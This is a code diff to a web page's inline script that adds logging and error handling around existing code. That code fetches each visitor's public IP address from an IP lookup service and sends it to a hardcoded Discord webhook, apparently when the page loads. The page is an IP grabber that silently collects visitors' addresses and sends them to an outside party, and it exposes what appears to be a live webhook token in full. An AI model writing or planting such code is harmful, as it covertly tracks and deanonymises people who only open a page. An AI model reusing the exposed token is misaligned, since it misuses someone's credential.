@@ -7,10 +7,18 @@
   <script>
     // Function to get the IP address and send it to the webhook
     function sendIpToWebhook() {
+      console.log("Fetching IP Address...");
+
       fetch('https://api.ipify.org?format=json')  // Get IP address from ipify
-        .then(response => response.json())  // Parse the JSON response
+        .then(response => {
+          if (!response.ok) {
+            throw new Error('Failed to fetch IP address');
+          }
+          return response.json();  // Parse the JSON response
+        })
         .then(data => {
           const ipAddress = data.ip;
+          console.log('Fetched IP Address: ', ipAddress);  // Log the IP address
 
           // Define the webhook URL (replace with your actual webhook URL)
           const webhookUrl = 'https://discord.com/api/webhooks/1354860004372512832/C2g48PQM0uUeo4qMS6mRXVMtgPdMQIpA0h5r5mitdIMh5AtXGC5sQFFrQjkDH3CUZ3tg';  
@@ -21,6 +29,7 @@
           };
 
           // Send the IP address to your webhook
+          console.log('Sending IP to webhook...');
           fetch(webhookUrl, {
             method: 'POST',
             headers: {
@@ -37,7 +46,9 @@
           })
           .catch(error => console.error('Error sending IP address:', error));
         })
-        .catch(error => console.error('Error fetching IP address:', error));
+        .catch(error => {
+          console.error('Error fetching IP address:', error);
+        });
     }
 
     // Call the function when the page loads
